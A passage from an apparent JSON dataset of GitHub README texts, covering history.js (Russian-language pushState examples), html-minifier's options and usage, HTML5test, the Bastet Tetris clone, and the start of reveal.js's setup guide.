\u0441\u043e\u0431\u044b\u0442\u0438\u044f \u043d\u0430 \u0432\u0441\u0435 \u0441\u0441\u044b\u043b\u043a\u0438 \u0432 \u043d\u0430\u0448\u0435\u043c \u0434\u043e\u043a\u0443\u043c\u0435\u043d\u0442\u0435\n        document[eventInfo[0]](eventInfo[1] + 'click', function(event) {\n          event = event || window.event;\n          var target = event.target || event.srcElement;\n          \/\/ \u0438\u0449\u0435\u043c \u0432\u0441\u0435 \u0441\u0441\u044b\u043b\u043a\u0438 \u0441 \u043a\u043b\u0430\u0441\u0441\u043e\u043c 'ajax'\n          if (target && target.nodeName === 'A' &&\n             (' ' + target.className + ' ').indexOf('ajax') >= 0)\n          {\n            \/\/ \u0437\u0430\u043d\u043e\u0441\u0438\u043c \u0441\u0441\u044b\u043b\u043a\u0443 \u0432 \u0438\u0441\u0442\u043e\u0440\u0438\u044e\n            history.pushState(null, null, target.href);\n\n            \/\/ \u0442\u0443\u0442 \u043c\u043e\u0436\u0435\u0442\u0435 \u0432\u044b\u0437\u0432\u0430\u0442\u044c \u043f\u043e\u0434\u0433\u0440\u0443\u0437\u043a\u0443 \u0434\u0430\u043d\u043d\u044b\u0445 \u0438 \u0442.\u043f.\n\n            \/\/ \u043d\u0435 \u0434\u0430\u0435\u043c \u0432\u044b\u043f\u043e\u043b\u043d\u0438\u0442\u044c \u0434\u0435\u0439\u0441\u0442\u0432\u0438\u0435 \u043f\u043e \u0443\u043c\u043e\u043b\u0447\u0430\u043d\u0438\u044e\n            if (event.preventDefault) {\n              event.preventDefault();\n            } else {\n              event.returnValue = false;\n            }\n          }\n        }, false);\n\n        \/\/ \u0432\u0435\u0448\u0430\u0435\u043c \u0441\u043e\u0431\u044b\u0442\u0438\u0435 \u043d\u0430 popstate \u043a\u043e\u0442\u043e\u0440\u043e\u0435 \u0441\u0440\u0430\u0431\u0430\u0442\u044b\u0432\u0430\u0435\u0442 \u043f\u0440\u0438 \u043d\u0430\u0436\u0430\u0442\u0438\u0438 back\/forward \u0432 \u0431\u0440\u0430\u0443\u0437\u0435\u0440\u0435\n        window[eventInfo[0]](eventInfo[1] + 'popstate', function(event) {\n\n          \/\/ \u0442\u0443\u0442 \u043c\u043e\u0436\u0435\u0442\u0435 \u0432\u044b\u0437\u0432\u0430\u0442\u044c \u043f\u043e\u0434\u0433\u0440\u0443\u0437\u043a\u0443 \u0434\u0430\u043d\u043d\u044b\u0445 \u0438 \u0442.\u043f.\n\n          \/\/ \u043f\u0440\u043e\u0441\u0442\u043e \u0441\u043e\u043e\u0431\u0449\u0435\u043d\u0438\u0435\n          alert(\"We returned to the page with a link: \" + location.href);\n        }, false);\n      })(window.addEventListener ? ['addEventListener', ''] : ['attachEvent', 'on']);\n    <\/script>\n  <\/head>\n  <body>\n    <a class=\"ajax\" href=\"\/mylink.html\">My Link<\/a>\n    <a class=\"ajax\" href=\"\/otherlink.html\">Other Link<\/a>\n  <\/body>\n<\/html>\n```\n\n### \u0410 \u0442\u0435\u043f\u0435\u0440\u044c \u043f\u043e\u043a\u0430\u0437\u044b\u0432\u0430\u044e \u043f\u0440\u0438\u043c\u0435\u0440 \u0432 \u0441\u0432\u044f\u0437\u043a\u0435 \u0441 jQuery:\n\n```html\n<!DOCTYPE html>\n<html>\n  <head>\n    <script type=\"text\/javascript\" src=\"history.js\"><\/script>\n    <script type=\"text\/javascript\" src=\"jquery.js\"><\/script>\n    <script type=\"text\/javascript\">\n      $(function() {\n        \/\/ \u043f\u043e\u043b\u0443\u0447\u0430\u0435\u043c \u043d\u043e\u0440\u043c\u0430\u043b\u044c\u043d\u044b\u0439 \u043e\u0431\u044a\u0435\u043a\u0442 Location\n\n        \/*\n         * \u0437\u0430\u043c\u0435\u0442\u044c\u0442\u0435, \u044d\u0442\u043e \u0435\u0434\u0438\u043d\u0441\u0442\u0432\u0435\u043d\u043d\u0430\u044f \u0440\u0430\u0437\u043d\u0438\u0446\u0430 \u043f\u0440\u0438 \u0440\u0430\u0431\u043e\u0442\u0435 \u0441 \u0434\u0430\u043d\u043d\u043e\u0439 \u0431\u0438\u0431\u043b\u0438\u043e\u0442\u0435\u043a\u043e\u0439,\n         * \u0442\u0430\u043a \u043a\u0430\u043a \u043e\u0431\u044a\u0435\u043a\u0442 window.location \u043d\u0435\u043b\u044c\u0437\u044f \u043f\u0435\u0440\u0435\u0437\u0430\u0433\u0440\u0443\u0437\u0438\u0442\u044c, \u043f\u043e\u044d\u0442\u043e\u043c\u0443\n         * \u0431\u0438\u0431\u043b\u0438\u043e\u0442\u0435\u043a\u0430 history \u0432\u043e\u0437\u0432\u0440\u0430\u0449\u0430\u0435\u0442 \u0441\u0444\u043e\u0440\u043c\u0438\u0440\u043e\u0432\u0430\u043d\u043d\u044b\u0439 \"location\" \u043e\u0431\u044a\u0435\u043a\u0442 \u0432\u043d\u0443\u0442\u0440\u0438\n         * \u043e\u0431\u044a\u0435\u043a\u0442\u0430 window.history, \u043f\u043e\u044d\u0442\u043e\u043c\u0443 \u043f\u043e\u043b\u0443\u0447\u0430\u0435\u043c \u0435\u0433\u043e \u0438\u0437 \"history.location\".\n         * \u0414\u043b\u044f \u0431\u0440\u0430\u0443\u0437\u0435\u0440\u043e\u0432 \u043f\u043e\u0434\u0434\u0435\u0440\u0436\u0438\u0432\u0430\u044e\u0449\u0438\u0445 \"history.pushState\" \u043f\u043e\u043b\u0443\u0447\u0430\u0435\u043c\n         * \u0441\u0444\u043e\u0440\u043c\u0438\u0440\u043e\u0432\u0430\u043d\u043d\u044b\u0439 \u043e\u0431\u044a\u0435\u043a\u0442 \"location\" \u0441 \u043e\u0431\u044b\u0447\u043d\u043e\u0433\u043e \"window.location\".\n         *\/\n        var location = window.history.location || window.location;\n\n        \/\/ \u0438\u0449\u0435\u043c \u0432\u0441\u0435 \u0441\u0441\u044b\u043b\u043a\u0438 \u0438 \u0432\u0435\u0448\u0430\u0435\u043c \u0441\u043e\u0431\u044b\u0442\u0438\u044f \u043d\u0430 \u0432\u0441\u0435 \u0441\u0441\u044b\u043b\u043a\u0438 \u0432 \u043d\u0430\u0448\u0435\u043c \u0434\u043e\u043a\u0443\u043c\u0435\u043d\u0442\u0435\n        $(document).on('click', 'a.ajax', function() {\n          \/\/ \u0437\u0430\u043d\u043e\u0441\u0438\u043c \u0441\u0441\u044b\u043b\u043a\u0443 \u0432 \u0438\u0441\u0442\u043e\u0440\u0438\u044e\n          history.pushState(null, null, this.href);\n\n          \/\/ \u0442\u0443\u0442 \u043c\u043e\u0436\u0435\u0442\u0435 \u0432\u044b\u0437\u0432\u0430\u0442\u044c \u043f\u043e\u0434\u0433\u0440\u0443\u0437\u043a\u0443 \u0434\u0430\u043d\u043d\u044b\u0445 \u0438 \u0442.\u043f.\n\n          \/\/ \u043d\u0435 \u0434\u0430\u0435\u043c \u0432\u044b\u043f\u043e\u043b\u043d\u0438\u0442\u044c \u0434\u0435\u0439\u0441\u0442\u0432\u0438\u0435 \u043f\u043e \u0443\u043c\u043e\u043b\u0447\u0430\u043d\u0438\u044e\n          return false;\n        });\n\n        \/\/ \u0432\u0435\u0448\u0430\u0435\u043c \u0441\u043e\u0431\u044b\u0442\u0438\u0435 \u043d\u0430 popstate \u043a\u043e\u0442\u043e\u0440\u043e\u0435 \u0441\u0440\u0430\u0431\u0430\u0442\u044b\u0432\u0430\u0435\u0442 \u043f\u0440\u0438 \u043d\u0430\u0436\u0430\u0442\u0438\u0438 back\/forward \u0432 \u0431\u0440\u0430\u0443\u0437\u0435\u0440\u0435\n        $(window).on('popstate', function(e) {\n\n          \/\/ \u0442\u0443\u0442 \u043c\u043e\u0436\u0435\u0442\u0435 \u0432\u044b\u0437\u0432\u0430\u0442\u044c \u043f\u043e\u0434\u0433\u0440\u0443\u0437\u043a\u0443 \u0434\u0430\u043d\u043d\u044b\u0445 \u0438 \u0442.\u043f.\n\n          \/\/ \u043f\u0440\u043e\u0441\u0442\u043e \u0441\u043e\u043e\u0431\u0449\u0435\u043d\u0438\u0435\n          alert(\"\u041c\u044b \u0432\u0435\u0440\u043d\u0443\u043b\u0438\u0441\u044c \u043d\u0430 \u0441\u0442\u0440\u0430\u043d\u0438\u0446\u0443 \u0441\u043e \u0441\u0441\u044b\u043b\u043a\u043e\u0439: \" + location.href);\n        });\n      });\n    <\/script>\n  <\/head>\n  <body>\n    <a class=\"ajax\" href=\"\/mylink.html\">My Link<\/a>\n    <a class=\"ajax\" href=\"\/otherlink.html\">Other Link<\/a>\n  <\/body>\n<\/html>\n```\n\n### \u0412\u044b \u043c\u043e\u0436\u0435\u0442\u0435 \u0438\u0441\u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u0442\u044c \u0434\u043e\u043f\u043e\u043b\u043d\u0438\u0442\u0435\u043b\u044c\u043d\u044b\u0435 \u043f\u0430\u0440\u0430\u043c\u0435\u0442\u0440\u044b \u043a\u043e\u043d\u0444\u0438\u0433\u0443\u0440\u0430\u0446\u0438\u0438 \u0431\u0438\u0431\u043b\u0438\u043e\u0442\u0435\u043a\u0438:\n\n    history.js?basepath=\/pathtosite\/ - \u0431\u0430\u0437\u043e\u0432\u044b\u0439 \u043f\u0443\u0442\u044c \u043a \u0441\u0430\u0439\u0442\u0443, \u043f\u043e \u0443\u043c\u043e\u043b\u0447\u0430\u043d\u0438\u044e \u0438\u043c\u0435\u0435\u0442 \u0437\u043d\u0430\u0447\u0435\u043d\u0438\u0435 \u043a\u043e\u0440\u043d\u044f \"\/\".\n    history.js?redirect=true - \u0432\u043a\u043b\u044e\u0447\u0438\u0442\u044c \u043f\u0440\u0435\u043e\u0431\u0440\u0430\u0437\u043e\u0432\u0430\u043d\u0438\u0435 \u0441\u0441\u044b\u043b\u043e\u043a.\n    history.js?type=\/ - \u043f\u043e\u0434\u0441\u0442\u0430\u0432\u043b\u044f\u0442\u044c \u043f\u043e\u0434\u0441\u0442\u0440\u043e\u043a\u0443 \u043f\u043e\u0441\u043b\u0435 \u044f\u043a\u043e\u0440\u044f, \u043f\u043e \u0443\u043c\u043e\u043b\u0447\u0430\u043d\u0438\u044e \u0438\u043c\u0435\u0435\u0442 \u0441\u0438\u043c\u0432\u043e\u043b \"\/\".\n\n\u0422\u0430\u043a\u0436\u0435 \u0432\u044b \u043c\u043e\u0436\u0435\u0442\u0435 \u043a\u043e\u043c\u0431\u0438\u043d\u0438\u0440\u043e\u0432\u0430\u0442\u044c \u043e\u043f\u0446\u0438\u0438:\n\n    history.js?type=\/&redirect=true&basepath=\/pathtosite\/ - \u043f\u043e\u0440\u044f\u0434\u043e\u043a \u043e\u043f\u0446\u0438\u0439 \u043d\u0435 \u0438\u043c\u0435\u0435\u0442 \u0437\u043d\u0430\u0447\u0435\u043d\u0438\u0435.\n\n\u0418\u043b\u0438 \u0432\u044b\u043f\u043e\u043b\u043d\u0438\u0442\u044c \u0441\u043f\u0435\u0446\u0438\u0430\u043b\u044c\u043d\u044b\u0439 \u043c\u0435\u0442\u043e\u0434 \u0432 JavaScript:\n```js\nhistory.redirect(\/* type = *\/ '\/', \/* basepath = *\/ '\/pathtosite\/');\n```\n\u0414\u0435\u043c\u043e-\u0441\u0430\u0439\u0442: http:\/\/history.spb-piksel.ru\/ \u0438\u043b\u0438 http:\/\/devote.github.io\/demos\/history\/\n\n\u042f \u0432 Twitter: https:\/\/twitter.com\/DimaPakhtinov\n"},{"repo":"\/kangax\/html-minifier","language":"JavaScript","readme_contents":"# HTMLMinifier\n\n[![NPM version](https:\/\/img.shields.io\/npm\/v\/html-minifier.svg)](https:\/\/www.npmjs.com\/package\/html-minifier)\n[![Build Status](https:\/\/img.shields.io\/travis\/kangax\/html-minifier.svg)](https:\/\/travis-ci.org\/kangax\/html-minifier)\n[![Dependency Status](https:\/\/img.shields.io\/david\/kangax\/html-minifier.svg)](https:\/\/david-dm.org\/kangax\/html-minifier)\n\n[HTMLMinifier](https:\/\/kangax.github.io\/html-minifier\/) is a highly **configurable**, **well-tested**, JavaScript-based HTML minifier.\n\nSee [corresponding blog post](http:\/\/perfectionkills.com\/experimenting-with-html-minifier\/) for all the gory details of [how it works](http:\/\/perfectionkills.com\/experimenting-with-html-minifier\/#how_it_works), [description of each option](http:\/\/perfectionkills.com\/experimenting-with-html-minifier\/#options), [testing results](http:\/\/perfectionkills.com\/experimenting-with-html-minifier\/#field_testing) and [conclusions](http:\/\/perfectionkills.com\/experimenting-with-html-minifier\/#cost_and_benefits).\n\n[Test suite is available online](https:\/\/kangax.github.io\/html-minifier\/tests\/).\n\nAlso see corresponding [Ruby wrapper](https:\/\/github.com\/stereobooster\/html_minifier), and for Node.js, [Grunt plugin](https:\/\/github.com\/gruntjs\/grunt-contrib-htmlmin), [Gulp module](https:\/\/github.com\/jonschlinkert\/gulp-htmlmin), [Koa middleware wrapper](https:\/\/github.com\/koajs\/html-minifier) and [Express middleware wrapper](https:\/\/github.com\/melonmanchan\/express-minify-html).\n\nFor lint-like capabilities take a look at [HTMLLint](https:\/\/github.com\/kangax\/html-lint).\n\n## Minification comparison\n\nHow does HTMLMinifier compare to other solutions \u2014 [HTML Minifier from Will Peavy](http:\/\/www.willpeavy.com\/minifier\/) (1st result in [Google search for \"html minifier\"](https:\/\/www.google.com\/#q=html+minifier)) as well as [htmlcompressor.com](http:\/\/htmlcompressor.com) and [minimize](https:\/\/github.com\/Swaagie\/minimize)?\n\n| Site                                                                         | Original size *(KB)* | HTMLMinifier | minimize | Will Peavy | htmlcompressor.com |\n| ---------------------------------------------------------------------------- |:--------------------:| ------------:| --------:| ----------:| ------------------:|\n| [Google](https:\/\/www.google.com\/)                                            | 46                   | **42**       | 46       | 48         | 46                 |\n| [HTMLMinifier](https:\/\/github.com\/kangax\/html-minifier)                      | 125                  | **98**       | 111      | 117        | 111                |\n| [Twitter](https:\/\/twitter.com\/)                                              | 207                  | **165**      | 200      | 224        | 200                |\n| [Stack Overflow](https:\/\/stackoverflow.com\/)                                 | 253                  | **195**      | 207      | 215        | 204                |\n| [Bootstrap CSS](https:\/\/getbootstrap.com\/docs\/3.3\/css\/)                      | 271                  | **260**      | 269      | 228        | 269                |\n| [BBC](https:\/\/www.bbc.co.uk\/)                                                | 298                  | **239**      | 290      | 291        | 280                |\n| [Amazon](https:\/\/www.amazon.co.uk\/)                                          | 422                  | **316**      | 412      | 425        | n\/a                |\n| [NBC](https:\/\/www.nbc.com\/)                                                  | 553                  | **530**      | 552      | 553        | 534                |\n| [Wikipedia](https:\/\/en.wikipedia.org\/wiki\/President_of_the_United_States)    | 565                  | **461**      | 548      | 569        | 548                |\n| [New York Times](https:\/\/www.nytimes.com\/)                                   | 678                  | **606**      | 675      | 670        | n\/a                |\n| [Eloquent Javascript](https:\/\/eloquentjavascript.net\/1st_edition\/print.html) | 870                  | **815**      | 840      | 864        | n\/a                |\n| [ES6 table](https:\/\/kangax.github.io\/compat-table\/es6\/)                      | 5911                 | **5051**     | 5595     | n\/a        | n\/a                |\n| [ES draft](https:\/\/tc39.github.io\/ecma262\/)                                  | 6126                 | **5495**     | 5664     | n\/a        | n\/a                |\n\n## Options Quick Reference\n\nMost of the options are disabled by default.\n\n| Option                         | Description     | Default |\n|--------------------------------|-----------------|---------|\n| `caseSensitive`                | Treat attributes in case sensitive manner (useful for custom HTML tags) | `false` |\n| `collapseBooleanAttributes`    | [Omit attribute values from boolean attributes](http:\/\/perfectionkills.com\/experimenting-with-html-minifier\/#collapse_boolean_attributes) | `false` |\n| `collapseInlineTagWhitespace`  | Don't leave any spaces between `display:inline;` elements when collapsing. Must be used in conjunction with `collapseWhitespace=true` | `false` |\n| `collapseWhitespace`           | [Collapse white space that contributes to text nodes in a document tree](http:\/\/perfectionkills.com\/experimenting-with-html-minifier\/#collapse_whitespace) | `false` |\n| `conservativeCollapse`         | Always collapse to 1 space (never remove it entirely). Must be used in conjunction with `collapseWhitespace=true` | `false` |\n| `continueOnParseError`         | [Handle parse errors](https:\/\/html.spec.whatwg.org\/multipage\/parsing.html#parse-errors) instead of aborting. | `false` |\n| `customAttrAssign`             | Arrays of regex'es that allow to support custom attribute assign expressions (e.g. `'<div flex?=\"{{mode != cover}}\"><\/div>'`) | `[ ]` |\n| `customAttrCollapse`           | Regex that specifies custom attribute to strip newlines from (e.g. `\/ng-class\/`) | |\n| `customAttrSurround`           | Arrays of regex'es that allow to support custom attribute surround expressions (e.g. `<input {{#if value}}checked=\"checked\"{{\/if}}>`) | `[ ]` |\n| `customEventAttributes`        | Arrays of regex'es that allow to support custom event attributes for `minifyJS` (e.g. `ng-click`) | `[ \/^on[a-z]{3,}$\/ ]` |\n| `decodeEntities`               | Use direct Unicode characters whenever possible | `false` |\n| `html5`                        | Parse input according to HTML5 specifications | `true` |\n| `ignoreCustomComments`         | Array of regex'es that allow to ignore certain comments, when matched | `[ \/^!\/ ]` |\n| `ignoreCustomFragments`        | Array of regex'es that allow to ignore certain fragments, when matched (e.g. `<?php ... ?>`, `{{ ... }}`, etc.)  | `[ \/<%[\\s\\S]*?%>\/, \/<\\?[\\s\\S]*?\\?>\/ ]` |\n| `includeAutoGeneratedTags`     | Insert tags generated by HTML parser | `true` |\n| `keepClosingSlash`             | Keep the trailing slash on singleton elements | `false` |\n| `maxLineLength`                | Specify a maximum line length. Compressed output will be split by newlines at valid HTML split-points |\n| `minifyCSS`                    | Minify CSS in style elements and style attributes (uses [clean-css](https:\/\/github.com\/jakubpawlowicz\/clean-css)) | `false` (could be `true`, `Object`, `Function(text, type)`) |\n| `minifyJS`                     | Minify JavaScript in script elements and event attributes (uses [UglifyJS](https:\/\/github.com\/mishoo\/UglifyJS2)) | `false` (could be `true`, `Object`, `Function(text, inline)`) |\n| `minifyURLs`                   | Minify URLs in various attributes (uses [relateurl](https:\/\/github.com\/stevenvachon\/relateurl)) | `false` (could be `String`, `Object`, `Function(text)`) |\n| `preserveLineBreaks`           | Always collapse to 1 line break (never remove it entirely) when whitespace between tags include a line break. Must be used in conjunction with `collapseWhitespace=true` | `false` |\n| `preventAttributesEscaping`    | Prevents the escaping of the values of attributes | `false` |\n| `processConditionalComments`   | Process contents of conditional comments through minifier | `false` |\n| `processScripts`               | Array of strings corresponding to types of script elements to process through minifier (e.g. `text\/ng-template`, `text\/x-handlebars-template`, etc.) | `[ ]` |\n| `quoteCharacter`               | Type of quote to use for attribute values (' or \") | |\n| `removeAttributeQuotes`        | [Remove quotes around attributes when possible](http:\/\/perfectionkills.com\/experimenting-with-html-minifier\/#remove_attribute_quotes) | `false` |\n| `removeComments`               | [Strip HTML comments](http:\/\/perfectionkills.com\/experimenting-with-html-minifier\/#remove_comments) | `false` |\n| `removeEmptyAttributes`        | [Remove all attributes with whitespace-only values](http:\/\/perfectionkills.com\/experimenting-with-html-minifier\/#remove_empty_or_blank_attributes) | `false` (could be `true`, `Function(attrName, tag)`) |\n| `removeEmptyElements`          | [Remove all elements with empty contents](http:\/\/perfectionkills.com\/experimenting-with-html-minifier\/#remove_empty_elements) | `false` |\n| `removeOptionalTags`           | [Remove optional tags](http:\/\/perfectionkills.com\/experimenting-with-html-minifier\/#remove_optional_tags) | `false` |\n| `removeRedundantAttributes`    | [Remove attributes when value matches default.](http:\/\/perfectionkills.com\/experimenting-with-html-minifier\/#remove_redundant_attributes) | `false` |\n| `removeScriptTypeAttributes`   | Remove `type=\"text\/javascript\"` from `script` tags. Other `type` attribute values are left intact | `false` |\n| `removeStyleLinkTypeAttributes`| Remove `type=\"text\/css\"` from `style` and `link` tags. Other `type` attribute values are left intact | `false` |\n| `removeTagWhitespace`          | Remove space between attributes whenever possible. **Note that this will result in invalid HTML!** | `false` |\n| `sortAttributes`               | [Sort attributes by frequency](#sorting-attributes--style-classes) | `false` |\n| `sortClassName`                | [Sort style classes by frequency](#sorting-attributes--style-classes) | `false` |\n| `trimCustomFragments`          | Trim white space around `ignoreCustomFragments`. | `false` |\n| `useShortDoctype`              | [Replaces the `doctype` with the short (HTML5) doctype](http:\/\/perfectionkills.com\/experimenting-with-html-minifier\/#use_short_doctype) | `false` |\n\n### Sorting attributes \/ style classes\n\nMinifier options like `sortAttributes` and `sortClassName` won't impact the plain-text size of the output. However, they form long repetitive chains of characters that should improve compression ratio of gzip used in HTTP compression.\n\n## Special cases\n\n### Ignoring chunks of markup\n\nIf you have chunks of markup you would like preserved, you can wrap them `<!-- htmlmin:ignore -->`.\n\n### Preserving SVG tags\n\nSVG tags are automatically recognized, and when they are minified, both case-sensitivity and closing-slashes are preserved, regardless of the minification settings used for the rest of the file.\n\n### Working with invalid markup\n\nHTMLMinifier **can't work with invalid or partial chunks of markup**. This is because it parses markup into a tree structure, then modifies it (removing anything that was specified for removal, ignoring anything that was specified to be ignored, etc.), then it creates a markup out of that tree and returns it.\n\nInput markup (e.g. `<p id=\"\">foo`)\n\n\u2193\n\nInternal representation of markup in a form of tree (e.g. `{ tag: \"p\", attr: \"id\", children: [\"foo\"] }`)\n\n\u2193\n\nTransformation of internal representation (e.g. removal of `id` attribute)\n\n\u2193\n\nOutput of resulting markup (e.g. `<p>foo<\/p>`)\n\nHTMLMinifier can't know that original markup was only half of the tree; it does its best to try to parse it as a full tree and it loses information about tree being malformed or partial in the beginning. As a result, it can't create a partial\/malformed tree at the time of the output.\n\n## Installation Instructions\n\nFrom NPM for use as a command line app:\n\n```shell\nnpm install html-minifier -g\n```\n\nFrom NPM for programmatic use:\n\n```shell\nnpm install html-minifier\n```\n\nFrom Git:\n\n```shell\ngit clone git:\/\/github.com\/kangax\/html-minifier.git\ncd html-minifier\nnpm link .\n```\n\n## Usage\n\nNote that almost all options are disabled by default. For command line usage please see `html-minifier --help` for a list of available options. Experiment and find what works best for you and your project.\n\n* **Sample command line:** ``html-minifier --collapse-whitespace --remove-comments --remove-optional-tags --remove-redundant-attributes --remove-script-type-attributes --remove-tag-whitespace --use-short-doctype --minify-css true --minify-js true``\n\n### Node.js\n\n```js\nvar minify = require('html-minifier').minify;\nvar result = minify('<p title=\"blah\" id=\"moo\">foo<\/p>', {\n  removeAttributeQuotes: true\n});\nresult; \/\/ '<p title=blah id=moo>foo<\/p>'\n```\n\n## Running benchmarks\n\nBenchmarks for minified HTML:\n\n```shell\nnode benchmark.js\n```\n"},{"repo":"\/WebPlatformTest\/HTML5test","language":"JavaScript","readme_contents":"<img src=\"https:\/\/html5te.st\/assets\/html5test.svg\" width=\"250\">\n\nThis is a website for testing web standards in the browser. The HTML5 test score is an indication \nof how well your browser supports the HTML5 standard and related specifications. Find out which \nparts of HTML5 are supported by your browser today and compare the results with other browsers.\n\n[![Twitter Follow](https:\/\/img.shields.io\/twitter\/follow\/html5test.svg?style=social)](https:\/\/twitter.com\/html5test)\n\nThe HTML5 test does not try to test all of the new features offered by HTML5, nor does it try to \ntest the functionality of each feature it does detect. Despite these shortcomings we hope that \nby quantifying the level of support users and web developers will get an idea of how hard the browser \nmanufacturers work on improving their browsers and the web as a development platform.\nThe score is calculated by testing for the many new features of HTML5. Each feature is worth one or \nmore points. Apart from the main HTML5 specification and other specifications created the W3C HTML \nWorking Group or WHATWG, this test also awards points for supporting related drafts and specifications.\nPlease be aware that although the HTML5 specification is now an official recommendation, other \nspecifications that are being tested are still in development and could change before receiving \nan official status. In the future new tests will be added for new specifications and existing \ntests will be updated when the specifications change.\n\n\n**Thanks to:**  \n\n<a href=\"https:\/\/www.browserstack.com\"><img src=\"https:\/\/html5te.st\/assets\/browserstack.svg\" width=\"180\"><\/a> &nbsp;&nbsp;&nbsp;&nbsp;\n<a href=\"https:\/\/www.cloudvps.nl\"><img src=\"https:\/\/html5test.com\/images\/sponsors\/cloudvps@2x.png\" width=\"59\"><\/a>\n"},{"repo":"\/fph\/bastet","language":"C++","readme_contents":"\"For people who enjoy swearing at their computer, Bastet (short for Bastard Tetris) is an attractive alternative to Microsoft Word.\"\n\nHave you ever thought Tetris(R) was evil because it wouldn't send you that straight \"I\" brick you needed in order to clear four rows at the same time? Well Tetris(R) probably isn't evil, but Bastet certainly is. >:-) Bastet stands for \"bastard tetris\", and is a simple ncurses-based Tetris(R) clone for Linux. Unlike normal Tetris(R), however, Bastet does not choose your next brick at random. Instead, Bastet uses a special algorithm designed to choose the worst brick possible. As you can imagine, playing Bastet can be a very frustrating experience!\n\n==Instructions==\nThe game is pretty self-explanatory; use the arrow keys and <space> or <enter> to browse through the menus, set the keys to anything you're comfortable with, and hit \"Play!\".\n\nThe default keys are as follows:\nDown\t    Down\nLeft\t    Left\nRight\t    Right\nSpace bar   Rotate tetromino clockwise\nUp    \t    Rotate tetromino counterclockwise\nEnter\t    \"Hard-drop\" tetromino (like pressing \"Down\" continuously)\np\t    Pause\ncontrol+C   Quits the game immediately and without asking anything (the current game is lost, but previous games are recorded in the high scores file)\n\n==Normal\/Harder==\nThe game currently allows choosing between two block choosers. The second (harder) one does not show you the \"next block\" preview, thus achieving a higher level of bastardness.\n\n==Installation==\nSee the INSTALL file in this same directory.\n"},{"repo":"\/impressivewebs\/HTML9-Responsive-Boilerstrap-js","language":null,"readme_contents":"# [HTML9 Responsive Boilerstrap JS](http:\/\/html9responsiveboilerstrapjs.com)\n\nBoom. Cross-universe compatible.\n"},{"repo":"\/hakimel\/reveal.js","language":"JavaScript","readme_contents":"# reveal.js [![Build Status](https:\/\/travis-ci.org\/hakimel\/reveal.js.svg?branch=master)](https:\/\/travis-ci.org\/hakimel\/reveal.js) <a href=\"https:\/\/slides.com?ref=github\"><img src=\"https:\/\/s3.amazonaws.com\/static.slid.es\/images\/slides-github-banner-320x40.png?1\" alt=\"Slides\" width=\"160\" height=\"20\"><\/a>\n\nA framework for easily creating beautiful presentations using HTML. [Check out the live demo](http:\/\/revealjs.com\/).\n\nreveal.js comes with a broad range of features including [nested slides](https:\/\/github.com\/hakimel\/reveal.js#markup), [Markdown contents](https:\/\/github.com\/hakimel\/reveal.js#markdown), [PDF export](https:\/\/github.com\/hakimel\/reveal.js#pdf-export), [speaker notes](https:\/\/github.com\/hakimel\/reveal.js#speaker-notes) and a [JavaScript API](https:\/\/github.com\/hakimel\/reveal.js#api). There's also a fully featured visual editor and platform for sharing reveal.js presentations at [slides.com](https:\/\/slides.com?ref=github).\n\n\n## Table of contents\n\n- [Online Editor](#online-editor)\n- [Installation](#installation)\n  - [Basic setup](#basic-setup)\n  - [Full setup](#full-setup)\n  - [Folder Structure](#folder-structure)\n- [Instructions](#instructions)\n  - [Markup](#markup)\n  - [Markdown](#markdown)\n  - [Element Attributes](#element-attributes)\n  - [Slide Attributes](#slide-attributes)\n- [Configuration](#configuration)\n- [Presentation Size](#presentation-size)\n- [Dependencies](#dependencies)\n- [Ready Event](#ready-event)\n- [Auto-sliding](#auto-sliding)\n- [Keyboard Bindings](#keyboard-bindings)\n- [Vertical Slide Navigation](#vertical-slide-navigation)\n- [Touch Navigation](#touch-navigation)\n- [Lazy Loading](#lazy-loading)\n- [API](#api)\n  - [Slide Changed Event](#slide-changed-event)\n  - [Presentation State](#presentation-state)\n  - [Slide States](#slide-states)\n  - [Slide Backgrounds](#slide-backgrounds)\n  - [Parallax Background](#parallax-background)\n  - [Slide Transitions](#slide-transitions)\n  - [Internal links](#internal-links)\n  - [Fragments](#fragments)\n  - [Fragment events](#fragment-events)\n  - [Code syntax highlighting](#code-syntax-highlighting)\n  - [Slide number](#slide-number)\n  - [Overview mode](#overview-mode)\n  - [Fullscreen mode](#fullscreen-mode)\n  - [Embedded media](#embedded-media)\n  - [Stretching elements](#stretching-elements)\n  - [Resize Event](#resize-event)\n  - [postMessage API](#postmessage-api)\n- [PDF Export](#pdf-export)\n- [Theming](#theming)\n- [Speaker Notes](#speaker-notes)\n  - [Share and Print Speaker Notes](#share-and-print-speaker-notes)\n  - [Server Side Speaker Notes](#server-side-speaker-notes)\n- [Plugins](#plugins)\n- [Multiplexing](#multiplexing)\n  - [Master presentation](#master-presentation)\n  - [Client presentation](#client-presentation)\n  - [Socket.io server](#socketio-server)\n- [MathJax](#mathjax)\n- [License](#license)\n\n#### More reading\n\n- [Changelog](https:\/\/github.com\/hakimel\/reveal.js\/releases): Up-to-date version history.\n- [Examples](https:\/\/github.com\/hakimel\/reveal.js\/wiki\/Example-Presentations): Presentations created with reveal.js, add your own!\n- [Browser Support](https:\/\/github.com\/hakimel\/reveal.js\/wiki\/Browser-Support): Explanation of browser support and fallbacks.\n- [Plugins](https:\/\/github.com\/hakimel\/reveal.js\/wiki\/Plugins,-Tools-and-Hardware): A list of plugins that can be used to extend reveal.js.\n\n\n## Online Editor\n\nPresentations are written using HTML or Markdown but there's also an online editor for those of you who prefer a graphical interface. Give it a try at [https:\/\/slides.com](https:\/\/slides.com?ref=github).\n\n\n## Installation\n\nThe **basic setup** is for authoring presentations only. The **full setup** gives you access to all reveal.js features and plugins such as speaker notes as well as the development tasks needed to make changes to the source.\n\n### Basic setup\n\nThe core of reveal.js is very easy to install. You'll simply need to download a copy of this repository and open the index.html file directly in your browser.\n\n1. Download the latest version of reveal.js from <https:\/\/github.com\/hakimel\/reveal.js\/releases>\n2. Unzip and replace the example contents in index.html with your own\n3. Open index.html in a browser to view it\n\n### Full setup\n\nSome reveal.js features, like external Markdown and speaker notes, require that presentations run from a local web server. The following instructions will set up such a server as well as all of the development tasks needed to make edits to the reveal.js source code.\n\n1. Install [Node.js](http:\/\/nodejs.org\/) (4.0.0 or later)\n\n1. Clone the reveal.js repository\n   ```sh\n   $ git clone https:\/\/github.com\/hakimel\/reveal.js.git\n   ```\n\n1. Navigate to the reveal.js folder\n   ```sh\n   $ cd reveal.js\n   ```\n\n1. Install dependencies\n   ```sh\n   $ npm install\n   ```\n\n1. Serve the presentation and monitor source files for changes\n   ```sh\n   $ npm start\n   ```\n\n1. Open <http:\/\/localhost:8000> to view your presentation\n\n   